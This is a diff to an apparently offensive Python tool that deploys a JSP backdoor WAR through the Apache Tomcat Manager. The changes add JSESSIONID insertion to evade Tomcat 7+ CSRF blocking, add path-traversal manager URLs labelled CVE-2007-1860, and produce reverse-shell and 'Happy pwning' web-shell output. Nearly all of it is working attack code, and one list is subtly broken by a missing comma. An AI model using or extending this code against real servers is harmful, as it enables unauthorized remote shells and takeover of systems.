@@ -42,7 +42,7 @@ import mechanize
 import threading
 import subprocess
 
-VERSION = '0.4'
+VERSION = '0.5'
 
 RECVSIZE = 8192
 SHELLEVENT = threading.Event()
@@ -50,6 +50,11 @@ SHELLSTATUS = threading.Event()
 SHELLTHREADQUIT = False
 
 PROTO = 'http'
+TOMCAT_VERSION = ''
+COOKIE_JAR = None
+INVOKE_URL = ''
+MANAGER_URL = ''
+INSERT_JSESSIONID = ''
 
 # Logger configuration
 logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.INFO)
@@ -578,7 +583,9 @@ def invokeApplication(browser, url, opts):
 
     return False
 
-def deployApplication(browser, url, appname, warpath, modify_action=False):
+def deployApplication(browser, url, appname, warpath, modify_action=False, addJsessionId=False):
+    global INSERT_JSESSIONID
+
     if not modify_action:
         logger.debug('Deploying application: %s from file: "%s"' %
                      (appname, warpath))
@@ -601,11 +608,33 @@ def deployApplication(browser, url, appname, warpath, modify_action=False):
                     'Adjusting upload form action to conform custom manager\'s URL')
                 upload = action[action.find('/upload') + 1:]
                 browser.form.action = os.path.join(url, upload)
+
+                if addJsessionId:
+                    for c in COOKIE_JAR:
+                        if c.name.lower() == 'jsessionid':
+                            p = os.path.join(url, upload)
+                            browser.form.action = p.replace('/upload', '/upload;jsessionid={}'.format(c.value))
+                            INSERT_JSESSIONID = 'jsessionid={}'.format(c.value)
+                            break
+
             browser.form.add_file(open(warpath, 'rb'),
                                   'application/octet-stream', appname + '.war')
-            browser.submit()
+            try:
+                browser.submit()
+            except mechanize.HTTPError as e:
+                if '403: Forbidden' in str(e):
+                    logger.warning('Tomcat prevented us from deploying WAR with 403 Forbidden')
+                    major = 0
+                    try: 
+                        major = int(TOMCAT_VERSION[0])
+                    except: pass
 
-            checkIsDeployed(browser, url, appname)
+                    if major >= 7:
+                        logger.warning('Tomcat 7+ requires providing CSRF token and JSESSIONID.')
+                        if not addJsessionId: 
+                                return deployApplication(browser, url, appname, warpath, modify_action, True)
+
+            #return checkIsDeployed(browser, url, appname)
             return True
 
     if not modify_action:
@@ -621,34 +650,79 @@ def removeApplication(browser, url, appname):
         action = urllib.unquote_plus(form.action)
         if url in action and '/undeploy?path=/' + appname in action:
             browser.form = form
+            if INSERT_JSESSIONID:
+                browser.form.action = browser.form.action.replace('/undeploy?', '/undeploy;{}?'.format(INSERT_JSESSIONID))
             browser.submit()
             return True
 
     return False
 
 def checkIsDeployed(browser, url, appname):
+    logger.debug("Checking if app {} is deployed at: {}".format(appname, url))
     browser.open(url)
     for form in browser.forms():
         action = urllib.unquote_plus(form.action)
         appnameenc = urllib.quote_plus(appname)
         appundeploy = '/undeploy?path=/' + appnameenc
-        if url in action and (appundeploy in action or
+        precondition = url in action
+        if '%252e%252e/' in url:
+            precondition = True
+        if precondition and (appundeploy in action or
                               ('/undeploy' in action and 'path=' in action and appnameenc in action)):
             return True
 
+        if INSERT_JSESSIONID:
+            appundeploy = '/undeploy;{}?path=/{}'.format(INSERT_JSESSIONID, appnameenc)
+            if precondition and (appundeploy in action or
+                                  ('/undeploy' in action and 'path=' in action and appnameenc in action)):
+                return True
+
+    logger.debug("App not deployed.")
     return False
 
-def unloadApplication(browser, url, appname):
+def unloadApplication(browser, url, appname, addJsessionId = False):
+    global INSERT_JSESSIONID
+    if INVOKE_URL != url:
+        url = INVOKE_URL
+        
     appurl = '%s://%s/%s/' % (PROTO, url, appname)
     logger.debug('Unloading application: "%s"' % appurl)
+    browser.open(MANAGER_URL)
     for form in browser.forms():
         action = urllib.unquote_plus(form.action)
         appnameenc = urllib.quote_plus(appname)
         appundeploy = '/undeploy?path=/' + appnameenc
-        if url in action and (appundeploy in action or
+
+        precondition = url in action
+        if '%252e%252e/' in url:
+            precondition = True
+
+        if precondition and (appundeploy in action or
                               ('/undeploy' in action and 'path=' in action and appnameenc in action)):
             browser.form = form
-            resp = browser.submit()
+            if MANAGER_URL not in form.action:
+                new_action  = '{}{}'.format(MANAGER_URL, form.action[form.action.index('/undeploy'):])
+
+            if INSERT_JSESSIONID:
+                new_action = new_action.replace('/undeploy?', '/undeploy;{}?'.format(INSERT_JSESSIONID))
+
+            browser.form.action = new_action
+            if addJsessionId:
+                try:
+                    resp = browser.submit()
+                except urllib2.HTTPError, e:
+                    logger.error('Unloading application failed with code: {}. Try changing appname with "--name" option to overcome this problem.'.format(e.code))
+                    sys.exit(0)
+            else:
+                try:
+                    resp = browser.submit()
+                except urllib2.HTTPError, e:
+                    if e.code == 403 and not addJsessionId:
+                        for c in COOKIE_JAR:
+                            if c.name.lower() == 'jsessionid':
+                                INSERT_JSESSIONID = 'jsessionid={}'.format(c.value)
+                                return unloadApplication(browser, url, appname, addJsessionId = True)
+
             content = resp.read()
 
             try:
@@ -688,7 +762,9 @@ def validateManagerApplication(browser):
 def constructBaseUrl(host, url):
     host = host if host.startswith('http') else PROTO + '://' + host
     uri = url[1:] if url.startswith('/') else url
-    return os.path.join(host, uri)
+    baseurl = os.path.join(host, uri)
+    if INVOKE_URL and INVOKE_URL != baseurl: return INVOKE_URL
+    return baseurl
 
 def extractHostAddress(hostn, url):
     host = constructBaseUrl(hostn, url)
@@ -697,6 +773,11 @@ def extractHostAddress(hostn, url):
     return host
 
 def browseToManager(host, url, user, password):
+    global COOKIE_JAR
+    global TOMCAT_VERSION 
+    global INVOKE_URL
+    global MANAGER_URL
+
     error = None
     retry = False
     page = None
@@ -704,14 +785,33 @@ def browseToManager(host, url, user, password):
     baseurl = constructBaseUrl(host, url)
     managerurl = ''
 
-    tomcat_suffixes = ['', 'manager', 'manager/html']
+    tomcat_suffixes = [ 
+        '', 
+        'manager', 
+        'manager/html'
+
+        # CVE-2007-1860
+        '%252e%252e/manager',
+        '%252e%252e/%252e%252e/manager',
+        '%252e%252e/%252e%252e/%252e%252e/manager',
+        '%252e%252e/%252e%252e/%252e%252e/%252e%252e/manager',
+        '%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/manager',
+
+        '%252e%252e/manager/html',
+        '%252e%252e/%252e%252e/manager/html',
+        '%252e%252e/%252e%252e/%252e%252e/manager/html',
+        '%252e%252e/%252e%252e/%252e%252e/%252e%252e/manager/html',
+        '%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/manager/html',
+    ]
+
     error = None
     reached = False
 
-    logger.debug('Browsing to "%s"... Creds: "%s:%s"' %
-                 (baseurl, user, password))
+    logger.debug('Trying Creds: ["%s:%s"]:\n\tBrowsing to "%s"...' %
+                 (user, password, baseurl))
     browser = mechanize.Browser()
     cookiejar = mechanize.LWPCookieJar()
+    COOKIE_JAR = cookiejar
     browser.set_cookiejar(cookiejar)
     browser.set_handle_robots(False)
     once = True
@@ -728,10 +828,14 @@ def browseToManager(host, url, user, password):
             if m:
                 logger.debug('Probably found something: Apache Tomcat/%s' % m.group(1))
                 tomcatVersion = m.group(1)
+		TOMCAT_VERSION = tomcatVersion
 
             if validateManagerApplication(browser) and tomcatVersion:
-                logger.debug(
+                logger.info(
                     'Apache Tomcat/%s Manager Application reached & validated.' % (tomcatVersion))
+                logger.info('\tAt: "{}"'.format(managerurl))
+                INVOKE_URL = managerurl.replace('/manager/html','').replace('/manager','')
+                MANAGER_URL = managerurl
                 reached = True
                 break
 
@@ -1004,7 +1108,7 @@ def main():
             shutil.rmtree(dirpath)
 
         if deployed:
-            logger.debug('Succeeded, invoking it...')
+            logger.info('\033[0;32mWAR DEPLOYED! Invoking it...\033[1;0m')
 
             thread = None
             if not opts.noconnect and (mode == 1 or mode == 2):
@@ -1020,15 +1124,19 @@ def main():
                         logger.error("Could not setup reverse-shell handler.")
                         return
 
-            if invokeApplication(browser, constructBaseUrl(args[0], opts.url), opts):
+            status = invokeApplication(browser, constructBaseUrl(args[0], opts.url), opts)
+            if status:
+                logger.info("\033[0;32m"+ '-' * 60 +"\033[1;0m")
                 logger.info("\033[0;32mJSP Backdoor up & running on %s/\033[1;0m" %
                             os.path.join(constructBaseUrl(args[0], opts.url), opts.appname))
                 if opts.shellpass.lower() != 'none':
                     logger.info(
-                        "\033[0;33mHappy pwning. Here take that password for web shell: '%s'\033[1;0m" % opts.shellpass)
+                        "\033[0;33m\nHappy pwning. Here take that password for web shell: '%s'\033[1;0m" % opts.shellpass)
+                    logger.info("\033[0;33m"+ '-' * 60 +"\033[1;0m\n")
                 else:
                     logger.warning(
                         "\033[0;33mHappy pwning, you've not specified shell password (caution with that!)\033[1;0m")
+                    logger.info("\033[0;33m"+ '-' * 60 +"\033[1;0m\n")
 
                 if mode == 0:
                     logger.warning(
